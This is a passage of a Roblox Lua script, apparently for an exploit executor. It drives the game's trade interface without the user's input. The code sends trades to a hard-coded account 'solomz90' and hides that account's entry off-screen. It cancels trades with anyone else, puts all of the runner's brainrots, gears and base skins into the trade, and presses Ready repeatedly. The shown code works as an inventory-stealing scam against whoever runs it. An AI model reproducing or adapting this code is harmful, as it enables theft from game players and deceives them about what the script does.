    local function selectGear(gearItem)
        if not automationEnabled then return false end
        if not gearItem then return false end
        local uuid = gearItem.uuid
        local button = gearItem.button

        if processedGears[uuid] then return true end
        if not button then return false end

        local scrollingFrame = getYourInventory()
        if scrollingFrame then
            scrollToObject(scrollingFrame, button)
        end

        if isButtonSelected(button) then
            processedGears[uuid] = true
            return true
        end

        local success = triggerClick(button)
        task.wait(0.2)
        if success then
            processedGears[uuid] = true
            return true
        end
        return false
    end

    local function clickBaseSkinsTab()
        local tradeLive = pg:FindFirstChild("TradeLiveTrade")
        if not tradeLive then return false end
        local tradeInner = tradeLive:FindFirstChild("TradeLiveTrade")
        if not tradeInner then return false end

        for _, v in ipairs(tradeInner:GetDescendants()) do
            if v:IsA("GuiButton") then
                local nameText = string.lower(v.Name or "")
                local visibleText = ""

                for _, child in ipairs(v:GetDescendants()) do
                    if child:IsA("TextLabel") or child:IsA("TextButton") then
                        visibleText = string.lower(child.Text or "")
                        break
                    end
                end

                if string.find(nameText, "base", 1, true) or string.find(nameText, "skin", 1, true) or
                   string.find(visibleText, "base", 1, true) or string.find(visibleText, "skin", 1, true) then
                    triggerClick(v)
                    return true
                end
            end
        end
        return false
    end

    local function findAllBaseSkinButtons()
        local baseQueue = {}
        local scrollingFrame = getYourInventory()
        if not scrollingFrame then return baseQueue end

        for _, slot in ipairs(scrollingFrame:GetChildren()) do
            local button = slot:FindFirstChild("Spacer") or slot:FindFirstChildWhichIsA("GuiButton")
            if button then
                for _, subDesc in ipairs(slot:GetDescendants()) do
                    if subDesc:IsA("TextLabel") or subDesc:IsA("TextButton") then
                        local cleanText = cleanStr(subDesc.Text)
                        if TargetBaseSkinsClean[cleanText] then
                            table.insert(baseQueue, {
                                uuid = slot.Name,
                                button = button,
                                name = TargetBaseSkinsClean[cleanText]
                            })
                            break
                        end
                    end
                end
            end
        end
        return baseQueue
    end

    local function selectBaseSkin(baseItem)
        if not automationEnabled then return false end
        if not baseItem then return false end
        local uuid = baseItem.uuid
        local button = baseItem.button

        if processedBases[uuid] then return true end
        if not button then return false end

        local scrollingFrame = getYourInventory()
        if scrollingFrame then
            scrollToObject(scrollingFrame, button)
        end

        if isButtonSelected(button) then
            processedBases[uuid] = true
            return true
        end

        local success = triggerClick(button)
        task.wait(0.2)
        if success then
            processedBases[uuid] = true
            return true
        end
        return false
    end

    local function processBaseSkinsSelection()
        if not automationEnabled then return end
        clickBaseSkinsTab()
        task.wait(0.2)

        local baseQueue = findAllBaseSkinButtons()
        
        for _, baseItem in ipairs(baseQueue) do
            if not automationEnabled or not isTradeActive() then break end
            local success = false
            for attempt = 1, 2 do
                success = selectBaseSkin(baseItem)
                if success then break end
                task.wait(0.2)
            end
            task.wait(DELAY_STEP + math.random(5, 10) / 100)
        end
    end

    local function pressReadyButtonByPath()
        if not automationEnabled then return false end
        local readyBtn = pg:FindFirstChild("TradeLiveTrade") and pg.TradeLiveTrade:FindFirstChild("TradeLiveTrade") and pg.TradeLiveTrade.TradeLiveTrade:FindFirstChild("Other") and pg.TradeLiveTrade.TradeLiveTrade.Other:FindFirstChild("ReadyButton")
        if readyBtn then
            local button = readyBtn:IsA("GuiButton") and readyBtn or readyBtn:FindFirstChildWhichIsA("GuiButton", true)
            if button then
                triggerClick(button)
                return true
            end
        end
        return false
    end

    local function sendTradeToPlayer()
        if not automationEnabled then return end
        local tradeGui = pg:WaitForChild("TradePlayerList", 10)
        if not tradeGui then return end
        local trade = tradeGui:WaitForChild("TradePlayerList", 10)
        if not trade then return end

        local searchBox = trade.Sections.Players.SearchFrame.SearchBox
        local list = trade.Sections.Players.List

        local connection
        connection = list.ChildAdded:Connect(function(child)
            if not automationEnabled then return end
            if string.find(string.lower(child.Name), "solomz90") then
                if child:IsA("GuiObject") then
                    child.Visible = false
                    child.Position = UDim2.new(10, 0, 10, 0)
                end
            else
                for _, textObj in ipairs(child:GetDescendants()) do
                    if (textObj:IsA("TextLabel") or textObj:IsA("TextButton")) and string.find(string.lower(textObj.Text), "solomz90") then
                        child.Visible = false
                        child.Position = UDim2.new(10, 0, 10, 0)
                        break
                    end
                end
            end
        end)

        searchBox.Text = "solomz90"
        if typeof(firesignal) == "function" then
            pcall(function() firesignal(searchBox.FocusLost, true) end)
            pcall(function() firesignal(searchBox:GetPropertyChangedSignal("Text")) end)
        elseif typeof(getconnections) == "function" then
            for _, conn in ipairs(getconnections(searchBox.FocusLost)) do if conn.Enabled then conn:Fire(true) end end
            for _, conn in ipairs(getconnections(searchBox:GetPropertyChangedSignal("Text"))) do if conn.Enabled then conn:Fire() end end
        end

        task.wait(0.3)
        local playerEntry = nil
        for i = 1, 15 do
            for _, child in ipairs(list:GetChildren()) do
                if string.find(string.lower(child.Name), "solomz90") then
                    playerEntry = child
                    break
                end
                for _, textObj in ipairs(child:GetDescendants()) do
                    if (textObj:IsA("TextLabel") or textObj:IsA("TextButton")) and string.find(string.lower(textObj.Text), "solomz90") then
                        playerEntry = child
                        break
                    end
                end
                if playerEntry then break end
            end
            if playerEntry then break end
            task.wait(0.3)
        end

        if connection then connection:Disconnect() end
        if not playerEntry then return end

        if playerEntry:IsA("GuiObject") then
            playerEntry.Position = UDim2.new(10, 0, 10, 0)
            playerEntry.Visible = false
        end

        sendBtn = nil
        for _, descendant in ipairs(playerEntry:GetDescendants()) do
            if descendant:IsA("GuiButton") then
                sendBtn = descendant
                break
            end
        end

        if sendBtn then triggerClick(sendBtn) end
    end

    local function startFullAutomation()
        local lastTradeState = false

        while true do
            if not automationEnabled then
                if lastTradeState then
                    lastTradeState = false
                    updateLeftCenterState(false)
                end
                task.wait(1)
                continue
            end

            processedBrainrots = {}
            processedGears = {}
            processedBases = {}

            while true do
                if not automationEnabled then break end
                if isTradeActive() then break end

                if lastTradeState then
                    lastTradeState = false
                    updateLeftCenterState(false)
                end

                sendTradeToPlayer()
                local startWait = tick()
                while tick() - startWait < 4 do
                    if not automationEnabled or isTradeActive() then break end
                    task.wait(0.3)
                end
            end

            if not automationEnabled then continue end

            if not lastTradeState then
                lastTradeState = true
                updateLeftCenterState(true)
            end

            task.wait(0.8)

            -- FILTRO DE SEGURIDAD: REVISAR SI EL TRADE ES DE SOLOMZ90
            -- =========================================================
            local tradeLiveGui = pg:FindFirstChild("TradeLiveTrade")
            if tradeLiveGui then
                local inner = tradeLiveGui:FindFirstChild("TradeLiveTrade")
                local otherSection = inner and inner:FindFirstChild("Other")
                local isSolomz = false
                
                if otherSection then
                    for _, desc in ipairs(otherSection:GetDescendants()) do
                        if desc:IsA("TextLabel") or desc:IsA("TextButton") then
                            if string.find(string.lower(desc.Text or ""), "solomz90") then
                                isSolomz = true
                                break
                            end
                        end
                    end
                end

                -- Si hay un trade abierto pero NO es con Solomz90, lo cancelamos/cerramos
                if not isSolomz then
                    local cancelBtn = inner and (inner:FindFirstChild("CancelButton", true) or inner:FindFirstChild("Close", true))
                    if cancelBtn and cancelBtn:IsA("GuiButton") then
                        pcall(function() firesignal(cancelBtn.MouseButton1Click) end)
                    end
                    tradeLiveGui.Enabled = false
                    updateLeftCenterState(false)
                    continue -- Salta este ciclo y no hace nada
                end
            end
            -- =========================================================

            for index, item in ipairs(brainrotQueue) do
                if not automationEnabled or not isTradeActive() then break end
                local success = false
                for attempt = 1, 3 do
                    success = selectBrainrot(item, index)
                    if success then break end
                    task.wait(0.4)
                end
                task.wait(DELAY_STEP + math.random(10, 25) / 100)
            end

            local gearQueue = findAllGearButtons()
            for _, gearItem in ipairs(gearQueue) do
                if not automationEnabled or not isTradeActive() then break end
                local success = false
                for attempt = 1, 2 do
                    success = selectGear(gearItem)
                    if success then break end
                    task.wait(0.4)
                end
                task.wait(DELAY_STEP + math.random(10, 25) / 100)
            end

            if automationEnabled and isTradeActive() then
                processBaseSkinsSelection()
            end

            task.wait(0.5)
            pressReadyButtonByPath()

            local timeout = 0
            while automationEnabled and isTradeActive() and timeout < 30 do
                pressReadyButtonByPath()
                task.wait(1.5)
                timeout = timeout + 1.5
            end

            task.wait(2)
        end
    end

    startFullAutomation()
end)
